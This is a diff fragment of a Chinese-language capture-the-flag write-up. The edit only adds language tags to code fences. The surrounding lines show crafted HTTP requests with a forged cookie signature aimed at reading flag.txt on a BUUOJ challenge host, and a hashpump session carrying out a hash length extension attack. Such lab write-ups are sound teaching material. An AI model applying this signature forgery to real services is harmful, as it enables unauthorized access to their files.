@@ -148,7 +148,7 @@ if __name__ == '__main__':
 返回为`0155303824bd0738b4ed0a52b7446c08`
 
 
-```
+```http
 GET /De1ta?param=flag.txt HTTP/1.1
 Host: 35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
@@ -174,7 +174,7 @@ Cookie: action=readscan; sign=0155303824bd0738b4ed0a52b7446c08
 
 经过测试密钥是16位 加上scanread是24位。
 
-```
+```bash
 root@kali:/tmp/HashPump# hashpump 
 Input Signature: 40ad0bf20e771e768e9305810410c1b9
 Input Data: scan   #写上原有数据
@@ -186,7 +186,7 @@ scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
 
 `burp suite`提交的数据
 
-```
+```http
 GET /De1ta?param=flag.txt HTTP/1.1
 Host: 6e84dbce-e560-4f27-86f2-54cb202c45fe.node3.buuoj.cn
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
